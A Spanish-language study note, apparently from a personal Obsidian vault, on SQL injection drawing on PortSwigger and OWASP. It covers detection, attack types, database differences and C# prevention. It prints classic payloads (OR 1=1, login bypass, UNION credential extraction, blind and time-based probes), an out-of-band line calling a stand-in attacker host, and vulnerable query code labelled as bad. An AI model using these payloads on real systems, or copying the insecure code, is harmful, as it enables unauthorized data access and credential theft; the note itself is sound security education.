---
type: concepto
state: activa
created: 2026-08-15
updated: 2026-08-15
tags: [sql, injection, sqli, portswigger, owasp, dast, sast]
---

# SQL Injection (SQLi)

> [!info] OWASP Top 10:2025
> **A05:Injection** — SQLi sigue siendo una de las vulnerabilidades web más críticas. Aunque los ORMs la reducen, aparece cuando se concatena SQL o se usa `FromSqlRaw()`. Fuente: PortSwigger Web Security Academy.

## QUÉ es

Vulnerabilidad que permite a un atacante **interferir con las consultas SQL que la aplicación realiza a su base de datos**. Permite:

- Ver datos que normalmente no podría recuperar (datos de otros usuarios, credenciales).
- Modificar o eliminar datos.
- Alterar el comportamiento de la aplicación.

## Impacto de un ataque exitoso

| Consecuencia | Descripción |
|--------------|-------------|
| **Acceso no autorizado a datos sensibles** | Contraseñas, tarjetas de crédito, PII de usuarios |
| **Compromiso total del sistema** | Escalada hasta comprometer el servidor o el back-end |
| **Denegación de Servicio (DoS)** | Bloqueo o caída de la base de datos |
| **Daño reputacional y multas** | Brechas de datos de alto perfil, regulaciones (GDPR, etc.) |
| **Persistencia** | Backdoor que pasa desapercibido por mucho tiempo |

## DÓNDE aparece

```
SELECT ... WHERE user_input ...   ← cláusula WHERE (lo más común)
UPDATE ... SET col = user_input   ← también en UPDATE
INSERT INTO ... VALUES (...)      ← también en INSERT
ORDER BY user_input               ← también en ORDER BY
```

## Detección

### Manual (sistemática, punto de entrada por punto)

1. **Comilla simple `'`** → observar errores o anomalías en la respuesta.
2. **Condiciones lógicas** → `OR 1=1` frente a `OR 1=2` (respuestas distintas = inyectable).
3. **Payloads con retardos de tiempo** → `pg_sleep()`, `SLEEP()`, `WAITFOR DELAY`.
4. **Payloads OAST** → interacciones de red fuera de banda (Burp Collaborator).

### Automática

> [!tip] Burp Scanner
> Herramientas automáticas como **Burp Scanner** encuentran SQLi de forma rápida y confiable. Úsalo como complemento, no como reemplazo de la prueba manual.

## Tipos de ataques

### 1. Recuperación de datos ocultos

```
Input:  ' OR 1=1 --
Query:  SELECT * FROM products WHERE category='' OR 1=1 --' AND released=1
        ↑ Comenta la restricción AND released=1 → muestra productos no publicados
```

- **`--`** comenta el resto de la query (anula restricciones).
- **`OR 1=1`** hace la condición siempre verdadera.

### 2. Subversión de la lógica de la aplicación (bypass de login)

```
Input:  administrator'--
Query:  SELECT * FROM users WHERE username='administrator'--' AND password='...'
        ↑ Se comenta la verificación de password → entra sin conocerla
```

### 3. Ataques UNION

Permiten recuperar datos de **otras tablas** añadiendo una segunda query:

```
Input:  ' UNION SELECT username, password FROM users--
Query:  SELECT name, description FROM products WHERE id='' UNION SELECT username, password FROM users--
```

> [!warning] Columnas
> La query original y la de UNION deben devolver el **mismo número de columnas** y tipos compatibles. Se detecta probando `ORDER BY n` o `NULL, NULL...` incrementando columnas hasta acertar.

### 4. Blind SQLi (inyección ciega)

Cuando la app **no devuelve resultados ni errores detallados**. Se explota por:

| Técnica | Mecanismo | Ejemplo |
|---------|-----------|---------|
| **Booleana** | Condición verdadera/falsa produce respuesta distinta | `' AND 1=1--` vs `' AND 1=2--` |
| **Basada en tiempo** | Retardo condicional detecta verdad | `' AND SLEEP(5)--` (MySQL) / `;WAITFOR DELAY '0:0:5'--` (SQL Server) |
| **OAST (out-of-band)** | Exfiltración por canal externo (DNS/HTTP) | `' UNION SELECT load_file('//attacker.dns')` |

### 5. Inyección de segundo orden

```
1. El usuario guarda input "seguro" en BD (sin inyectarse al insertar).
2. La app recupera ese dato y lo incorpora en OTRA query insegura.
3. El payload se ejecuta recién ahí → más difícil de detectar por DAST.
```

## Diferencias entre bases de datos

No asumas que el payload funciona igual en todas las plataformas:

| Aspecto | Oracle | MySQL | SQL Server |
|---------|--------|-------|-----------|
| Concatenación | `\|\|` | `CONCAT()` | `+` |
| Comentario | `--` | `--`, `#` | `--` |
| Retardo | `DBMS_LOCK.SLEEP()` / `UTL_INET` | `SLEEP(n)` | `WAITFOR DELAY '0:0:5'` |
| Versión | `v$version` | `@@version` | `@@version` |

> [!warning] Identificar el motor
> Consultar la versión (ej. `v$version` en Oracle) es fundamental para ajustar el payload. El DAST (ej. OWASP ZAP) lo detecta probando fingerprints de cada motor.

## Prevención

### Consultas parametrizadas (sentencias preparadas) — LA defensa principal

> [!tip] Regla de oro
> La entrada del usuario se trata **siempre como dato**, nunca como parte ejecutable de la query. Nunca decidas caso por caso si un dato es "seguro": parametrizá constantemente.

```csharp
// ❌ MAL — concatenación de strings
var query = $"SELECT * FROM Users WHERE Username = '{username}' AND Password = '{password}'";

// ✅ BIEN — LINQ genera SQL parametrizado automáticamente
var user = await context.Users
    .Where(u => u.Username == username && u.Password == password)
    .FirstOrDefaultAsync();

// ✅ BIEN — SQL crudo pero parametrizado
var users = await context.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Username = {username}")
    .ToListAsync();
```

```csharp
// ❌ MAL — FromSqlRaw con interpolación = concatenación disfrazada
var users = await context.Users
    .FromSqlRaw($"SELECT * FROM Users WHERE Username = '{username}'")
    .ToListAsync();
```

### Listas blancas (whitelisting)

Para partes de la query que **no aceptan parámetros** (nombres de tablas, columnas, `ORDER BY`):

```csharp
// ❌ MAL — input directo en ORDER BY (no se puede parametrizar)
var q = $"SELECT * FROM Products ORDER BY {userColumn}";

// ✅ BIEN — validar contra lista de valores permitidos
var allowed = new[] { "Name", "Price", "CreatedAt" };
if (!allowed.Contains(userColumn))
    throw new ArgumentException("Columna no permitida");
var q = $"SELECT * FROM Products ORDER BY {userColumn}";
```

### No confiar en los datos

- Validar todo input en el límite (API/service layer).
- No mostrar errores de BD al usuario (stack traces = info para el atacante → OWASP A09 Logging Failures / errores).
- Principio de mínimo privilegio en la BD (nunca conectarse con `sa`).

## Referencia
- [[40 - RECURSOS/MOCs/MOC - Pentesting]]
- [[MOC - DevSecOps]]
- [[40 - RECURSOS/Conceptos/Injection]]
- [[20 - PROYECTOS/DevSecOps-Proyecto/Fase-0-Seguridad/Input-Validation]]
- [[40 - RECURSOS/Conceptos/Best-Practices]]
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)

---
#sql #injection #sqli #portswigger #owasp #dast #sast
